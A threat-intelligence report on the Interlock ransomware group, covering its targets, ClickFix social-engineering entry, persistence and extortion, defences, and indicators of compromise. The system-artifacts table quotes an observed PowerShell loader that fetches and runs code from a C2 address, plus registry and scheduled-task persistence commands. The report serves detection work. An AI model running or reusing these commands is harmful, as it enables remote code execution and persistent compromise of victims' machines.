# Threat Report: Interlock Ransomware Group (Nefarious Mantis)

This report summarizes the Interlock ransomware group, their targets, attack methods, and actionable defense recommendations.

---

## Who is Interlock?

The **Interlock ransomware group** (also called *Nefarious Mantis*) is a financially motivated and opportunistic threat actor first observed in **September 2024**.  

- Operates as a **closed group** (not RaaS).  
- Conducts **double extortion campaigns**: data theft → encryption → threat to leak on their site **“Worldwide Secrets Blog.”**  
- CISA and FBI issued warnings in **2025** due to increased activity and upgraded malware.  
- May be a **spin-off of Rhysida ransomware**.  

> **Key Takeaway:** Interlock combines social engineering and living-off-the-land techniques with strong extortion pressure.

---

## Targeting

Interlock attacks **businesses and critical infrastructure sectors** in North America, Europe, and Australia.  

**Targeted sectors include:**  
- Healthcare  
- Education  
- Technology  
- Government  
- Manufacturing  
- Hospitality  
- Financial services  

**Notable attacks:**  
- **DaVita (Apr 2025):** 1.5 TB of data stolen, >200,000 dialysis patients affected.  
- **City of St. Paul, MN (Jul 2025):** City systems offline, ~3,500 employee records at risk.  

---

## Attack Methods

### Initial Access
- Compromised websites + **ClickFix social engineering** technique.  
- Fake “prove you are human” prompts / malicious software updaters (Chrome/Edge).  
- Built with PyInstaller: installs a decoy + runs hidden PowerShell payload.  
- ClickFix tricks users into manually running **Windows + R → CTRL + V** to execute backdoors.  

### Execution, Persistence, & Evasion
- PowerShell backdoor runs stealthily in **detached mode**.  
- Collects system info → sends to C2 via HTTP.  
- Uses **obfuscation** (char codes, XOR, Gzip) for stealth.  
- Persistence: Windows registry keys for reboot survival.  
- C2: Abuses **Cloudflare’s TryCloudflare tunneling** + uses tools like:  
  - Cobalt Strike  
  - Interlock RAT  
  - NodeSnake RAT  
  - SystemBC  

### Double Extortion
- Encrypts primarily **VMs (Windows + Linux)**, leaving hosts/physical servers intact.  
- Non-paying victims exposed on **Worldwide Secrets Blog** (leak site).  
- Ransom notes warn of permanent data loss, fines, and reputational damage.  

---

## Recommended Defenses

### Employee Training
- Regular awareness on phishing, fake updates, and other ClickFix techniques.  

### Prevent Initial Access
- DNS filtering & web firewalls to block known malicious domains.  
- Block tunneling tools (like **TryCloudflare**) unless operationally required.  

### Incident Response Planning
- Maintain and regularly test an IR plan.  
- Have IR team or external partners on standby.  

### Continuous Monitoring
- Watch for the following **IOCs**:

## Indicators of Compromise

### Malware Hashes

#### Table View
| Malware Name | Hash Type | File Hash | Details | First Reported | Source |
|--------------|-----------|-----------|---------|----------------|--------|
| dodgy.js     | SHA-256   | 2acaa9856ee58537c06cc2858fd71b860f53219504e6756faa3812019b5df5a6 | – | 2025-02-21 | Arctic Wolf |
|              | SHA-256   | 0b47e53f2ada0555588aa8a6a4491e14d7b2528c9a829ebb6f7e9463963cd0e4 | – | 2025-03-27 | Arctic Wolf |
| 12341234     | SHA-256   | 7501623230eef2f6125dcf5b5d867991bdf333d878706d77c1690b632195c3ff | ClickFix PowerShell Loader | 2025-04-17 | Arctic Wolf |
|              | SHA-256   | 3e4407dfd827714a66e25c2baccefd915233eeec8fb093257e458f4153778bee | Interlock RAT | 2025-03-27 | Arctic Wolf |
|              | SHA-256   | 0b47e53f2ada0555588aa8a6a4491e14d7b2528c9a829ebb6f7e9463963cd0e4 | Interlock RAT | 2025-03-27 | Arctic Wolf |
|              | SHA-256   | fcdbe8f6204919f94fd57309806f5609ae88ae1bbd000d6226f25d2200cf6d47 | Interlock RAT | 2025-03-27 | Arctic Wolf |
| budget       | SHA-256   | 61d092e5c7c8200377a8bd9c10288c2766186a11153dcaa04ae9d1200db7b1c5 | Interlock RAT | 2025-02-27 | Arctic Wolf |
| chst.sh      | SHA-1     | 6b4bdffdd5734842120e1772d1c81ee7bd99c2f1 | ESXi Interlock Ransomware Script | 2025-04-23 | Arctic Wolf |
| conhost      | SHA-1     | 9256cc0ec4607becf8e72d6d416bf9e6da0e03dd | ESXi Interlock Ransomware Script | 2025-04-23 | Arctic Wolf |
| conhost.exe  | SHA-1     | bd19b3ccfb5220b53acff5474a7f63b95775a2c7 | Interlock Ransomware | 2025-04-23 | Arctic Wolf |
| complexion   | SHA-256   | 6b72706fe0a0d2192d578e9e754d0e3f5715154a41bd18f80b32adcffad26522 | Interlock RAT | 2025-05-19 | Arctic Wolf |
|              | SHA-256   | 60d95d385e76bb83d38d713887d2fa311b4ecd9c5013882cd648afdeeb5dc7c3 | Interlock RAT | 2025-07-28 | Arctic Wolf |
|              | SHA-256   | e40e82b77019edca06c7760b6133c6cc481d9a22585dd80bce393f0bfbe47a99 | Interlock RAT | 2025-06-30 | Arctic Wolf |
|              | SHA-256   | 0dd67fa3129acbf191eeb683fb164074cc1ba5d7bce286e0cc5ad47cc0bbcef0 | Interlock RAT | 2025-06-30 | Arctic Wolf |
|              | SHA-256   | b28a9062100a7fbf0f65dbb23db319717c4e613e890d0a3f1ae27ec6e34cf35a | Interlock RAT | 2025-06-30 | Arctic Wolf |

---

### Copy/Paste Hash List
```text
2acaa9856ee58537c06cc2858fd71b860f53219504e6756faa3812019b5df5a6
0b47e53f2ada0555588aa8a6a4491e14d7b2528c9a829ebb6f7e9463963cd0e4
7501623230eef2f6125dcf5b5d867991bdf333d878706d77c1690b632195c3ff
3e4407dfd827714a66e25c2baccefd915233eeec8fb093257e458f4153778bee
fcdbe8f6204919f94fd57309806f5609ae88ae1bbd000d6226f25d2200cf6d47
61d092e5c7c8200377a8bd9c10288c2766186a11153dcaa04ae9d1200db7b1c5
6b4bdffdd5734842120e1772d1c81ee7bd99c2f1
9256cc0ec4607becf8e72d6d416bf9e6da0e03dd
bd19b3ccfb5220b53acff5474a7f63b95775a2c7
6b72706fe0a0d2192d578e9e754d0e3f5715154a41bd18f80b32adcffad26522
60d95d385e76bb83d38d713887d2fa311b4ecd9c5013882cd648afdeeb5dc7c3
e40e82b77019edca06c7760b6133c6cc481d9a22585dd80bce393f0bfbe47a99
0dd67fa3129acbf191eeb683fb164074cc1ba5d7bce286e0cc5ad47cc0bbcef0
b28a9062100a7fbf0f65dbb23db319717c4e613e890d0a3f1ae27ec6e34cf35a
```
### Network Artifacts

#### Table View
| Network Artifact | Details | Intrusion Phase | First Reported | Source |
|------------------|---------|-----------------|----------------|--------|
| 168.119.96[.]41  | Backdoor C2 | Command and Control | 2025-02-25 | Arctic Wolf |
| 95.217.22[.]175  | Backdoor C2 | Command and Control | 2025-02-25 | Arctic Wolf |
| 178.156.129[.]27 | Backdoor C2 | Command and Control | 2025-02-25 | Arctic Wolf |
| Cluders[.]org    | Suspicious domain connected to Interlock ransomware | Initial Access | 2025-04-30 | Arctic Wolf |
| Bronxy[.]cc      | Suspicious domain connected to Interlock ransomware | Initial Access | 2025-05-02 | Arctic Wolf |
| fake-domain-1892572220[.]com | Suspicious domain connected to Interlock ransomware | Initial Access | 2025-04-22 | Arctic Wolf |
| Basiclock[.]cc   | Suspicious domain connected to Interlock ransomware | Initial Access | 2025-04-30 | Arctic Wolf |
| Dijoin[.]org     | Suspicious domain connected to Interlock ransomware | Initial Access | 2025-05-02 | Arctic Wolf |
| Playiro[.]net    | Suspicious domain connected to Interlock ransomware | Initial Access | 2025-04-30 | Arctic Wolf |
| Doriot[.]info    | Suspicious domain connected to Interlock ransomware | Initial Access | 2025-05-02 | Arctic Wolf |
| Kingrouder[.]tech| Suspicious domain connected to Interlock ransomware | Initial Access | 2025-04-30 | Arctic Wolf |
| Peasplecore[.]net| Suspicious domain connected to Interlock ransomware | Initial Access | 2025-05-01 | Arctic Wolf |
| Dashes[.]cc      | Payload Server | Initial Access | 2025-04-30 | Arctic Wolf |
| Nettixx[.]com    | Compromised WordPress site | Initial Access | 2025-04-30 | Arctic Wolf |
| 159.69.3[.]151   | C2 | Command and Control | 2025-04-02 | Arctic Wolf |
| 128.140.120[.]188| C2 | Command and Control | 2025-06-30 | Esentire |
| 177.136.225[.]135| C2 | Command and Control | 2025-06-30 | Esentire |
| 167.235.235[.]151| C2 | Command and Control | 2025-06-30 | Esentire |
| 216.245.184[.]181| C2 | Command and Control | 2025-04-02 | Arctic Wolf |
| fake-domain-1892572220[.]com | C2 | Command and Control | 2025-04-21 | Arctic Wolf |
| 5.161.225[.]197  | Backdoor C2 | Command and Control | 2025-04-21 | Arctic Wolf |
| 91.99.10[.]54    | C2 | Command and Control | 2025-04-28 | Arctic Wolf |
| 138.199.156[.]22 | C2 | Command and Control | 2025-04-28 | Arctic Wolf |
| 128.140.120[.]188| C2 | Command and Control | 2025-05-19 | Arctic Wolf |
| 188.34.195[.]44  | C2 | Command and Control | 2025-04-30 | Arctic Wolf |
| 45.61.136[.]202  | C2 | Command and Control | 2025-04-30 | Arctic Wolf |
| 49.12.69[.]80    | C2 | Command and Control | 2025-04-30 | Arctic Wolf |
| 212.237.217[.]182| C2 | Command and Control | 2025-06-10 | Arctic Wolf |
| 177.136.225[.]135| C2 | Command and Control | 2025-06-03 | Arctic Wolf |
| 216.245.184[.]181| C2 | Command and Control | 2025-06-10 | Arctic Wolf |
| 193.149.180[.]58 | C2 | Command and Control | 2025-04-30 | Arctic Wolf |
| 188.34.195[.]44  | C2 | Command and Control | 2025-06-10 | Arctic Wolf |
| 138.199.156[.]22 | C2 | Command and Control | 2025-04-30 | Arctic Wolf |
| 128.140.120[.]188| C2 | Command and Control | 2025-05-20 | Arctic Wolf |
| 192.64.86[.]175  | C2 | Command and Control | 2025-04-30 | Arctic Wolf |
| 91.99.10[.]54    | C2 | Command and Control | 2025-04-30 | Arctic Wolf |
| 5.161.225[.]197  | C2 | Command and Control | 2025-04-30 | Arctic Wolf |
| 168.119.96[.]41  | C2 | Command and Control | 2025-06-10 | Arctic Wolf |

---

### System Artifacts

#### Table View
| Host Artifact | Details | Source |
|---------------|---------|--------|
| `PowerShell.exe -w h -c "iex $(irm 138[.]199.156[.]22:8080/$($z = [datetime]::UtcNow; $y = ([datetime]('01/01/' + '1970')); $x = ($z – $y).TotalSeconds; $w = [math]::Floor($x); $v = $w – ($w % 16); [int64]$v))"` | Observed PowerShell C2 loader | Arctic Wolf |
| `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ChromeUpdater" /t REG_SZ /d "C:\Users\<redacted>\AppData\Roaming\node-v22.11.0-win-x64\node.exe C:\Users\<redacted>\AppData\Roaming\node-v22.11.0-win-x64\p16iir70.log" /f` | Registry Key Used to Establish Persistence | Arctic Wolf |
| `schtasks /create /sc DAILY /tn "TaskSystem" /tr "cmd /C cd %s && %s" /st 20:00 /ru system > nul` | Scheduled Task | Arctic Wolf |
| `C:\Users\<redacted>\AppData\Roaming\node-v22.11.0-win-x64\node.exe` | File Artifact | Arctic Wolf |
| `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v 0neDrive /t REG_SZ /d` | Registry Key | Arctic Wolf |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ChromeUpdater` | Registry Key | Arctic Wolf |

---
